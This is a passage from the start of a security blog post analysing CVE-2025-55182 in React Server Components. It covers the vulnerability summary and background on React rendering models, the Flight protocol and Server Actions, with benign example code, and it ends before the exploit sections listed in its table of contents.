<!doctype html><html lang=en-US><head><meta http-equiv=X-Clacks-Overhead content="GNU Terry Pratchett"><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>React2Shell: CVE-2025-55182 Technical Analysis | aniket/awwfensive</title><meta name=title content="React2Shell: CVE-2025-55182 Technical Analysis"><meta name=description content="
  
  
    Executive Summary
    Prerequisites: Understanding React&rsquo;s Rendering Models
      
        Traditional Client-Side Rendering (CSR)
        Server-Side Rendering (SSR)
        React Server Components (RSC) - The Paradigm Shift
        The Flight Protocol: How RSC Communication Works
        Server Actions: The Attack Surface
      
    
    JavaScript Fundamentals You Need to Know
      
        1. Objects and Property Access
        2. The Prototype Chain: JavaScript&rsquo;s Inheritance System
        3. Bracket Notation Traverses the Entire Chain
        4. The Function Constructor: Eval on Steroids
        5. Thenables: JavaScript&rsquo;s Promise Duck Typing
        6. Combining Techniques: The Full Attack
        Key Takeaways for Secure Coding
      
    
    The Vulnerability Explained
      
        Root Cause: Missing hasOwnProperty Check in requireModule
        The Fix (React 19.0.1+)
      
    
    How the Exploit Works
      
        Understanding React Flight Protocol
        Attack Technique 1: Prototype Chain Traversal
        Attack Technique 2: Thenables - Turning Data into Execution
        Attack Technique 3: Breaking the Object Boundary with $@
        Attack Technique 4: Forcing Second Deserialization with status
        Attack Technique 5: Context Confusion via _response
        Attack Technique 6: Blob Resolution - The Kill Chain
        Attack Technique 7: Weaponized RCE Payload
      
    
    The POC
      
        Step 1: Find the Vulnerable Application
        Step 2: Craft and Send the Exploit
      
    
    Real-World Impact
      
        What Attackers Can Do
        Observed in the Wild
      
    
    Additional Related Vulnerabilities
    Key Takeaways for Developers
      
        Security Best Practices
        For Security Teams
      
    
    Technical Resources
    Conclusion
  



Executive Summary
The Threat: CVE-2025-55182 is a critical remote code execution vulnerability in React Server Components that allows unauthenticated attackers to execute arbitrary code on servers through a single malicious HTTP request. No credentials, no user interaction, no special configuration required."><meta name=keywords content><meta property="og:url" content="https://awwfensive.site/react2shell-cve-2025-55182-technical-analysis/"><meta property="og:site_name" content="aniket/awwfensive"><meta property="og:title" content="React2Shell: CVE-2025-55182 Technical Analysis"><meta property="og:description" content="Executive Summary Prerequisites: Understanding React’s Rendering Models Traditional Client-Side Rendering (CSR) Server-Side Rendering (SSR) React Server Components (RSC) - The Paradigm Shift The Flight Protocol: How RSC Communication Works Server Actions: The Attack Surface JavaScript Fundamentals You Need to Know 1. Objects and Property Access 2. The Prototype Chain: JavaScript’s Inheritance System 3. Bracket Notation Traverses the Entire Chain 4. The Function Constructor: Eval on Steroids 5. Thenables: JavaScript’s Promise Duck Typing 6. Combining Techniques: The Full Attack Key Takeaways for Secure Coding The Vulnerability Explained Root Cause: Missing hasOwnProperty Check in requireModule The Fix (React 19.0.1+) How the Exploit Works Understanding React Flight Protocol Attack Technique 1: Prototype Chain Traversal Attack Technique 2: Thenables - Turning Data into Execution Attack Technique 3: Breaking the Object Boundary with $@ Attack Technique 4: Forcing Second Deserialization with status Attack Technique 5: Context Confusion via _response Attack Technique 6: Blob Resolution - The Kill Chain Attack Technique 7: Weaponized RCE Payload The POC Step 1: Find the Vulnerable Application Step 2: Craft and Send the Exploit Real-World Impact What Attackers Can Do Observed in the Wild Additional Related Vulnerabilities Key Takeaways for Developers Security Best Practices For Security Teams Technical Resources Conclusion Executive Summary The Threat: CVE-2025-55182 is a critical remote code execution vulnerability in React Server Components that allows unauthenticated attackers to execute arbitrary code on servers through a single malicious HTTP request. No credentials, no user interaction, no special configuration required."><meta property="og:locale" content="en_US"><meta property="og:type" content="article"><meta property="article:section" content="blog"><meta property="article:published_time" content="2025-12-20T11:51:55+05:30"><meta property="article:modified_time" content="2025-12-20T11:51:55+05:30"><meta name=twitter:card content="summary"><meta name=twitter:title content="React2Shell: CVE-2025-55182 Technical Analysis"><meta name=twitter:description content="Executive Summary Prerequisites: Understanding React’s Rendering Models Traditional Client-Side Rendering (CSR) Server-Side Rendering (SSR) React Server Components (RSC) - The Paradigm Shift The Flight Protocol: How RSC Communication Works Server Actions: The Attack Surface JavaScript Fundamentals You Need to Know 1. Objects and Property Access 2. The Prototype Chain: JavaScript’s Inheritance System 3. Bracket Notation Traverses the Entire Chain 4. The Function Constructor: Eval on Steroids 5. Thenables: JavaScript’s Promise Duck Typing 6. Combining Techniques: The Full Attack Key Takeaways for Secure Coding The Vulnerability Explained Root Cause: Missing hasOwnProperty Check in requireModule The Fix (React 19.0.1+) How the Exploit Works Understanding React Flight Protocol Attack Technique 1: Prototype Chain Traversal Attack Technique 2: Thenables - Turning Data into Execution Attack Technique 3: Breaking the Object Boundary with $@ Attack Technique 4: Forcing Second Deserialization with status Attack Technique 5: Context Confusion via _response Attack Technique 6: Blob Resolution - The Kill Chain Attack Technique 7: Weaponized RCE Payload The POC Step 1: Find the Vulnerable Application Step 2: Craft and Send the Exploit Real-World Impact What Attackers Can Do Observed in the Wild Additional Related Vulnerabilities Key Takeaways for Developers Security Best Practices For Security Teams Technical Resources Conclusion Executive Summary The Threat: CVE-2025-55182 is a critical remote code execution vulnerability in React Server Components that allows unauthenticated attackers to execute arbitrary code on servers through a single malicious HTTP request. No credentials, no user interaction, no special configuration required."><meta itemprop=name content="React2Shell: CVE-2025-55182 Technical Analysis"><meta itemprop=description content="Executive Summary Prerequisites: Understanding React’s Rendering Models Traditional Client-Side Rendering (CSR) Server-Side Rendering (SSR) React Server Components (RSC) - The Paradigm Shift The Flight Protocol: How RSC Communication Works Server Actions: The Attack Surface JavaScript Fundamentals You Need to Know 1. Objects and Property Access 2. The Prototype Chain: JavaScript’s Inheritance System 3. Bracket Notation Traverses the Entire Chain 4. The Function Constructor: Eval on Steroids 5. Thenables: JavaScript’s Promise Duck Typing 6. Combining Techniques: The Full Attack Key Takeaways for Secure Coding The Vulnerability Explained Root Cause: Missing hasOwnProperty Check in requireModule The Fix (React 19.0.1+) How the Exploit Works Understanding React Flight Protocol Attack Technique 1: Prototype Chain Traversal Attack Technique 2: Thenables - Turning Data into Execution Attack Technique 3: Breaking the Object Boundary with $@ Attack Technique 4: Forcing Second Deserialization with status Attack Technique 5: Context Confusion via _response Attack Technique 6: Blob Resolution - The Kill Chain Attack Technique 7: Weaponized RCE Payload The POC Step 1: Find the Vulnerable Application Step 2: Craft and Send the Exploit Real-World Impact What Attackers Can Do Observed in the Wild Additional Related Vulnerabilities Key Takeaways for Developers Security Best Practices For Security Teams Technical Resources Conclusion Executive Summary The Threat: CVE-2025-55182 is a critical remote code execution vulnerability in React Server Components that allows unauthenticated attackers to execute arbitrary code on servers through a single malicious HTTP request. No credentials, no user interaction, no special configuration required."><meta itemprop=datePublished content="2025-12-20T11:51:55+05:30"><meta itemprop=dateModified content="2025-12-20T11:51:55+05:30"><meta itemprop=wordCount content="3983"><meta name=referrer content="no-referrer-when-downgrade"><style>:root{--width:720px;--font-main:Verdana, sans-serif;--font-secondary:Verdana, sans-serif;--font-scale:1em;--background-color:#fff;--heading-color:#222;--text-color:#444;--link-color:#3273dc;--visited-color:#8b6fcb;--blockquote-color:#222}@media(prefers-color-scheme:dark){:root{--background-color:#01242e;--heading-color:#eee;--text-color:#ddd;--link-color:#8cc2dd;--visited-color:#8b6fcb;--blockquote-color:#ccc}}body{font-family:var(--font-secondary);font-size:var(--font-scale);margin:auto;padding:20px;max-width:var(--width);text-align:left;background-color:var(--background-color);word-wrap:break-word;overflow-wrap:break-word;line-height:1.5;color:var(--text-color)}h1,h2,h3,h4,h5,h6{font-family:var(--font-main);color:var(--heading-color)}a{color:var(--link-color);cursor:pointer;text-decoration:none}a:hover{text-decoration:underline}nav a{margin-right:8px}strong,b{color:var(--heading-color)}button{margin:0;cursor:pointer}time{font-family:monospace;font-style:normal;font-size:15px}main{line-height:1.6}table{width:100%}hr{border:0;border-top:1px dashed}img{max-width:100%}code{font-family:monospace;padding:2px;border-radius:3px}blockquote{border-left:1px solid #999;color:var(--blockquote-color);padding-left:20px;font-style:italic}footer{padding:25px 0;text-align:center}.title:hover{text-decoration:none}.title h1{font-size:1.5em}.inline{width:auto!important}.highlight,.code{border-radius:3px;margin-block-start:1em;margin-block-end:1em;overflow-x:auto}ul.blog-posts{list-style-type:none;padding:unset}ul.blog-posts li{display:flex}ul.blog-posts li span{flex:0 0 130px}ul.blog-posts li a:visited{color:var(--visited-color)}</style><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;500;700&display=swap" rel=stylesheet><style>:root{--bg:#ffffff;--text:#000000;--link:#8f0000}@media(prefers-color-scheme:dark){:root{--bg:#ffffff;--text:#000000;--link:#8f0000}}body{background-color:#fff;color:#1a1a1a;font-family:roboto mono,monospace;line-height:1.6;font-size:1em;max-width:720px;margin:0 auto;padding:20px}h1,h2,h3,h4,h5,h6,p,li,span,div{color:#1a1a1a!important;font-family:roboto mono,monospace}strong,b,em,i,mark{color:#1a1a1a!important}h1{font-size:2em;line-height:1.2}h2{font-size:1.5em;margin-top:2rem}h3{font-size:1.2em;margin-top:1.5rem}header h1,header h1 a,header a.title,body>header>h1,body>header>h1>a{color:#000!important;text-decoration:none!important;font-size:1.1em;font-family:roboto mono,monospace}header h1 a:hover{color:#000!important}article h1,article h2,main h1,main h2{color:#000!important}a{color:#8f0000!important;text-decoration:underline}a:hover{color:#600!important}header h1 a{text-decoration:none!important}header nav a{margin-right:1.5rem}header{border-bottom:1px solid #ccc;padding-bottom:1rem;margin-bottom:2rem}footer{border-top:none;padding-top:1rem;margin-top:3rem}.blog-posts article{border-bottom:1px solid #e0e0e0;padding-bottom:1rem;margin-bottom:1rem}.blog-posts article:last-child{border-bottom:none}.highlight{margin:1.5rem 0}.highlight pre{background-color:#f6f8fa!important;padding:1rem;border-radius:4px;overflow-x:auto;line-height:1.5;border:none}.highlight pre code,.highlight code{background:0 0!important}code{font-family:roboto mono,courier new,monospace;font-size:.9em}p code,li code,h1 code,h2 code,h3 code{background-color:#f6f8fa!important;color:#8f0000!important;padding:2px 6px;border-radius:3px}.highlight .c{color:green!important;font-style:italic}.highlight .err{color:red!important}.highlight .k{color:#00f!important}.highlight .o{color:#000!important}.highlight .cm{color:green!important;font-style:italic}.highlight .cp{color:#00f!important}.highlight .c1{color:green!important;font-style:italic}.highlight .cs{color:green!important;font-style:italic}.highlight .gd{color:red!important}.highlight .ge{font-style:italic}.highlight .gr{color:red!important}.highlight .gh{color:navy!important;font-weight:700}.highlight .gi{color:#0f0!important}.highlight .go{color:gray!important}.highlight .gp{color:gray!important}.highlight .gs{font-weight:700}.highlight .gu{color:purple!important;font-weight:700}.highlight .gt{color:red!important}.highlight .kc{color:#00f!important}.highlight .kd{color:#00f!important}.highlight .kn{color:#00f!important}.highlight .kp{color:#00f!important}.highlight .kr{color:#00f!important}.highlight .kt{color:#00f!important}.highlight .m{color:#098658!important}.highlight .s{color:#a31515!important}.highlight .na{color:red!important}.highlight .nb{color:#00f!important}.highlight .nc{color:#267f99!important}.highlight .no{color:#00f!important}.highlight .nd{color:#267f99!important}.highlight .ni{color:#00f!important}.highlight .ne{color:#267f99!important}.highlight .nf{color:#795e26!important}.highlight .nl{color:#00f!important}.highlight .nn{color:#267f99!important}.highlight .nt{color:maroon!important}.highlight .nv{color:#001080!important}.highlight .ow{color:#00f!important}.highlight .w{color:#000!important}.highlight .mb{color:#098658!important}.highlight .mf{color:#098658!important}.highlight .mh{color:#098658!important}.highlight .mi{color:#098658!important}.highlight .mo{color:#098658!important}.highlight .sa{color:#a31515!important}.highlight .sb{color:#a31515!important}.highlight .sc{color:#a31515!important}.highlight .dl{color:#a31515!important}.highlight .sd{color:green!important;font-style:italic}.highlight .s2{color:#a31515!important}.highlight .se{color:#e00!important}.highlight .sh{color:#a31515!important}.highlight .si{color:#a31515!important}.highlight .sx{color:#a31515!important}.highlight .sr{color:#d16969!important}.highlight .s1{color:#a31515!important}.highlight .ss{color:#a31515!important}.highlight .bp{color:#00f!important}.highlight .fm{color:#795e26!important}.highlight .vc{color:#001080!important}.highlight .vg{color:#001080!important}.highlight .vi{color:#001080!important}.highlight .vm{color:#001080!important}.highlight .il{color:#098658!important}#TableOfContents{background-color:initial;border:none;padding:0;margin:2rem 0;border-radius:0}#TableOfContents{background-color:initial;border:none;padding:0;margin:2rem 0;border-radius:0}#TableOfContents ul{list-style:disc;padding-left:2rem;margin:.5rem 0}#TableOfContents>ul{padding-left:2rem}#TableOfContents ul ul{list-style:circle;padding-left:2rem}#TableOfContents li{margin:.5rem 0}#TableOfContents a{color:#8f0000!important;text-decoration:underline!important}#TableOfContents a:hover{color:#600!important}table{width:100%;border-collapse:collapse;margin:1.5rem 0;background-color:#fff}table th,table td{padding:.75rem;text-align:left;border:1px solid #e1e4e8}table th{background-color:#f6f8fa;font-weight:700}table code{background-color:#f6f8fa;padding:2px 6px;border-radius:3px;color:#24292e}</style></head><body><header><a href=/ class=title><h2>aniket/awwfensive</h2></a><nav><a href=/>Home</a>
<a href=/blog/>Blog</a>
<a href=/projects/>Projects</a></nav></header><main><h1>React2Shell: CVE-2025-55182 Technical Analysis</h1><p><i><time datetime=2025-12-20>20 Dec, 2025</time></i></p><content><div class=toc><nav id=TableOfContents><ul><li><a href=#executive-summary>Executive Summary</a></li><li><a href=#prerequisites-understanding-reacts-rendering-models>Prerequisites: Understanding React&rsquo;s Rendering Models</a><ul><li><a href=#traditional-client-side-rendering-csr>Traditional Client-Side Rendering (CSR)</a></li><li><a href=#server-side-rendering-ssr>Server-Side Rendering (SSR)</a></li><li><a href=#react-server-components-rsc---the-paradigm-shift>React Server Components (RSC) - The Paradigm Shift</a></li><li><a href=#the-flight-protocol-how-rsc-communication-works>The Flight Protocol: How RSC Communication Works</a></li><li><a href=#server-actions-the-attack-surface>Server Actions: The Attack Surface</a></li></ul></li><li><a href=#javascript-fundamentals-you-need-to-know>JavaScript Fundamentals You Need to Know</a><ul><li><a href=#1-objects-and-property-access>1. Objects and Property Access</a></li><li><a href=#2-the-prototype-chain-javascripts-inheritance-system>2. The Prototype Chain: JavaScript&rsquo;s Inheritance System</a></li><li><a href=#3-bracket-notation-traverses-the-entire-chain>3. Bracket Notation Traverses the Entire Chain</a></li><li><a href=#4-the-function-constructor-eval-on-steroids>4. The Function Constructor: Eval on Steroids</a></li><li><a href=#5-thenables-javascripts-promise-duck-typing>5. Thenables: JavaScript&rsquo;s Promise Duck Typing</a></li><li><a href=#6-combining-techniques-the-full-attack>6. Combining Techniques: The Full Attack</a></li><li><a href=#key-takeaways-for-secure-coding>Key Takeaways for Secure Coding</a></li></ul></li><li><a href=#the-vulnerability-explained>The Vulnerability Explained</a><ul><li><a href=#root-cause-missing-hasownproperty-check-in-requiremodule>Root Cause: Missing hasOwnProperty Check in requireModule</a></li><li><a href=#the-fix-react-1901>The Fix (React 19.0.1+)</a></li></ul></li><li><a href=#how-the-exploit-works>How the Exploit Works</a><ul><li><a href=#understanding-react-flight-protocol>Understanding React Flight Protocol</a></li><li><a href=#attack-technique-1-prototype-chain-traversal>Attack Technique 1: Prototype Chain Traversal</a></li><li><a href=#attack-technique-2-thenables---turning-data-into-execution>Attack Technique 2: Thenables - Turning Data into Execution</a></li><li><a href=#attack-technique-3-breaking-the-object-boundary-with->Attack Technique 3: Breaking the Object Boundary with <code>$@</code></a></li><li><a href=#attack-technique-4-forcing-second-deserialization-with-status>Attack Technique 4: Forcing Second Deserialization with <code>status</code></a></li><li><a href=#attack-technique-5-context-confusion-via-_response>Attack Technique 5: Context Confusion via <code>_response</code></a></li><li><a href=#attack-technique-6-blob-resolution---the-kill-chain>Attack Technique 6: Blob Resolution - The Kill Chain</a></li><li><a href=#attack-technique-7-weaponized-rce-payload>Attack Technique 7: Weaponized RCE Payload</a></li></ul></li><li><a href=#the-poc>The POC</a><ul><li><a href=#step-1-find-the-vulnerable-application>Step 1: Find the Vulnerable Application</a></li><li><a href=#step-2-craft-and-send-the-exploit>Step 2: Craft and Send the Exploit</a></li></ul></li><li><a href=#real-world-impact>Real-World Impact</a><ul><li><a href=#what-attackers-can-do>What Attackers Can Do</a></li><li><a href=#observed-in-the-wild>Observed in the Wild</a></li></ul></li><li><a href=#additional-related-vulnerabilities>Additional Related Vulnerabilities</a></li><li><a href=#key-takeaways-for-developers>Key Takeaways for Developers</a><ul><li><a href=#security-best-practices>Security Best Practices</a></li><li><a href=#for-security-teams>For Security Teams</a></li></ul></li><li><a href=#technical-resources>Technical Resources</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div><hr><h2 id=executive-summary>Executive Summary</h2><p><strong>The Threat:</strong> CVE-2025-55182 is a critical remote code execution vulnerability in React Server Components that allows unauthenticated attackers to execute arbitrary code on servers through a single malicious HTTP request. No credentials, no user interaction, no special configuration required.</p><blockquote><p><strong>What is it?</strong> An unsafe deserialization vulnerability in React&rsquo;s Flight protocol that allows prototype chain traversal to access dangerous Node.js built-ins like <code>child_process</code> and <code>vm</code>.</p></blockquote><h2 id=prerequisites-understanding-reacts-rendering-models>Prerequisites: Understanding React&rsquo;s Rendering Models</h2><p>To understand how CVE-2025-55182 works, you first need to understand how React evolved from client-side rendering to Server Components. Let&rsquo;s build this foundation.</p><h3 id=traditional-client-side-rendering-csr>Traditional Client-Side Rendering (CSR)</h3><p>In classic React applications, everything happens in the browser:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// Server sends minimal HTML
</span></span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>html</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=o>&lt;</span><span class=nx>body</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=nx>div</span> <span class=nx>id</span><span class=o>=</span><span class=s2>&#34;root&#34;</span><span class=o>&gt;&lt;</span><span class=err>/div&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=nx>script</span> <span class=nx>src</span><span class=o>=</span><span class=s2>&#34;bundle.js&#34;</span><span class=o>&gt;&lt;</span><span class=err>/script&gt;</span>
</span></span><span class=line><span class=cl>  <span class=o>&lt;</span><span class=err>/body&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=err>/html&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// React runs in browser, builds entire UI
</span></span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>App</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=p>[</span><span class=nx>data</span><span class=p>,</span> <span class=nx>setData</span><span class=p>]</span> <span class=o>=</span> <span class=nx>useState</span><span class=p>(</span><span class=kc>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=nx>useEffect</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;/api/data&#39;</span><span class=p>).</span><span class=nx>then</span><span class=p>(</span><span class=nx>r</span> <span class=p>=&gt;</span> <span class=nx>setData</span><span class=p>(</span><span class=nx>r</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span> <span class=p>[]);</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=o>&lt;</span><span class=nx>div</span><span class=o>&gt;</span><span class=p>{</span><span class=nx>data</span><span class=p>}</span><span class=o>&lt;</span><span class=err>/div&gt;;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><strong>Problems:</strong> Large JavaScript bundles, slow initial page load, SEO challenges, and waterfalls of data fetching.</p><h3 id=server-side-rendering-ssr>Server-Side Rendering (SSR)</h3><p>SSR improved things by rendering the initial HTML on the server:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// Server generates full HTML
</span></span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>html</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=o>&lt;</span><span class=nx>body</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=nx>div</span> <span class=nx>id</span><span class=o>=</span><span class=s2>&#34;root&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=o>&lt;</span><span class=nx>div</span><span class=o>&gt;</span><span class=nx>User</span><span class=o>:</span> <span class=nx>Alice</span><span class=o>&lt;</span><span class=err>/div&gt;  &lt;!-- Already rendered! --&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=err>/div&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=nx>script</span> <span class=nx>src</span><span class=o>=</span><span class=s2>&#34;bundle.js&#34;</span><span class=o>&gt;&lt;</span><span class=err>/script&gt;</span>
</span></span><span class=line><span class=cl>  <span class=o>&lt;</span><span class=err>/body&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=err>/html&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Then React &#34;hydrates&#34; - attaches event listeners
</span></span></span><span class=line><span class=cl><span class=c1>// But you still ship ALL component code to the browser
</span></span></span></code></pre></div><p><strong>Key Limitation:</strong> Even with SSR, every component&rsquo;s code must be shipped to the browser for hydration. If you have a large data table component, that entire component&rsquo;s JavaScript goes to the client, even though the data was already rendered on the server.</p><h3 id=react-server-components-rsc---the-paradigm-shift>React Server Components (RSC) - The Paradigm Shift</h3><p>React Server Components fundamentally change what goes to the client. Components are split into two categories:</p><ul><li><strong>Server Components:</strong> Run only on the server, never sent to the client</li><li><strong>Client Components:</strong> Run in the browser (marked with <code>'use client'</code>)</li></ul><h4 id=why-this-matters>Why This Matters</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// Server Component (no &#39;use client&#39; directive)
</span></span></span><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span> <span class=nx>UserProfile</span><span class=p>({</span> <span class=nx>userId</span> <span class=p>})</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// This code NEVER goes to the browser
</span></span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>db</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>connectToDatabase</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>user</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>db</span><span class=p>.</span><span class=nx>query</span><span class=p>(</span><span class=s1>&#39;SELECT * FROM users WHERE id = ?&#39;</span><span class=p>,</span> <span class=p>[</span><span class=nx>userId</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=nx>div</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=o>&lt;</span><span class=nx>h1</span><span class=o>&gt;</span><span class=p>{</span><span class=nx>user</span><span class=p>.</span><span class=nx>name</span><span class=p>}</span><span class=o>&lt;</span><span class=err>/h1&gt;</span>
</span></span><span class=line><span class=cl>      <span class=o>&lt;</span><span class=nx>Bio</span> <span class=nx>user</span><span class=o>=</span><span class=p>{</span><span class=nx>user</span><span class=p>}</span> <span class=o>/&gt;</span>           <span class=p>{</span><span class=cm>/* Server Component */</span><span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=o>&lt;</span><span class=nx>LikeButton</span> <span class=nx>userId</span><span class=o>=</span><span class=p>{</span><span class=nx>userId</span><span class=p>}</span> <span class=o>/&gt;</span> <span class=p>{</span><span class=cm>/* Client Component */</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=err>/div&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Client Component (needs interactivity)
</span></span></span><span class=line><span class=cl><span class=s1>&#39;use client&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>LikeButton</span><span class=p>({</span> <span class=nx>userId</span> <span class=p>})</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=p>[</span><span class=nx>liked</span><span class=p>,</span> <span class=nx>setLiked</span><span class=p>]</span> <span class=o>=</span> <span class=nx>useState</span><span class=p>(</span><span class=kc>false</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=o>&lt;</span><span class=nx>button</span> <span class=nx>onClick</span><span class=o>=</span><span class=p>{()</span> <span class=p>=&gt;</span> <span class=nx>setLiked</span><span class=p>(</span><span class=o>!</span><span class=nx>liked</span><span class=p>)}</span><span class=o>&gt;</span><span class=nx>Like</span><span class=o>&lt;</span><span class=err>/button&gt;;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><strong>The Magic:</strong> The database code, the query logic, the entire <code>UserProfile</code> component never gets sent to the browser. Only the rendered output and the <code>LikeButton</code> component code are shipped to the client.</p><h3 id=the-flight-protocol-how-rsc-communication-works>The Flight Protocol: How RSC Communication Works</h3><p>Here&rsquo;s where the vulnerability lives. Server Components need a way to send their rendered output to the client. React uses the &ldquo;Flight&rdquo; protocol:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>// 1. Client requests a Server Component
</span></span></span><span class=line><span class=cl><span class=err>GET /profile/123
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>// 2. Server executes component, serializes result
</span></span></span><span class=line><span class=cl><span class=err>// Flight protocol output (simplified):
</span></span></span><span class=line><span class=cl><span class=err>M1:{&#34;id&#34;:&#34;./Button.js&#34;,&#34;chunks&#34;:[&#34;client1&#34;],&#34;name&#34;:&#34;Button&#34;}
</span></span></span><span class=line><span class=cl><span class=err>J0:[&#34;$&#34;,&#34;div&#34;,null,{&#34;children&#34;:[&#34;$&#34;,&#34;h1&#34;,null,{&#34;children&#34;:&#34;Alice&#34;}]}]
</span></span></span><span class=line><span class=cl><span class=err>S2:[&#34;$&#34;,&#34;@1&#34;,null,{&#34;userId&#34;:&#34;123&#34;}]
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>// 3. Client receives and reconstructs the UI
</span></span></span><span class=line><span class=cl><span class=err>// Server Component parts: Rendered as HTML
</span></span></span><span class=line><span class=cl><span class=err>// Client Component references: Loaded and hydrated
</span></span></span></code></pre></div><p><strong>Critical for Understanding the Exploit:</strong> The Flight protocol serializes component references, props, and module imports. When the server sends a reference to a module export like <code>saveUser</code>, it sends metadata that tells the client how to reconstruct it. The vulnerability exists in how this deserialization happens.</p><h3 id=server-actions-the-attack-surface>Server Actions: The Attack Surface</h3><p>Server Actions let you call server-side functions from client code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// Server Component defines an action
</span></span></span><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span> <span class=nx>saveProfile</span><span class=p>(</span><span class=nx>formData</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=s1>&#39;use server&#39;</span><span class=p>;</span> <span class=c1>// This marks it as a Server Action
</span></span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>name</span> <span class=o>=</span> <span class=nx>formData</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;name&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kr>await</span> <span class=nx>db</span><span class=p>.</span><span class=nx>updateUser</span><span class=p>(</span><span class=nx>name</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Client Component calls it
</span></span></span><span class=line><span class=cl><span class=s1>&#39;use client&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>ProfileForm</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=nx>form</span> <span class=nx>action</span><span class=o>=</span><span class=p>{</span><span class=nx>saveProfile</span><span class=p>}</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=o>&lt;</span><span class=nx>input</span> <span class=nx>name</span><span class=o>=</span><span class=s2>&#34;name&#34;</span> <span class=o>/&gt;</span>
</span></span><span class=line><span class=cl>      <span class=o>&lt;</span><span class=nx>button</span><span class=o>&gt;</span><span class=nx>Save</span><span class=o>&lt;</span><span class=err>/button&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=err>/form&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
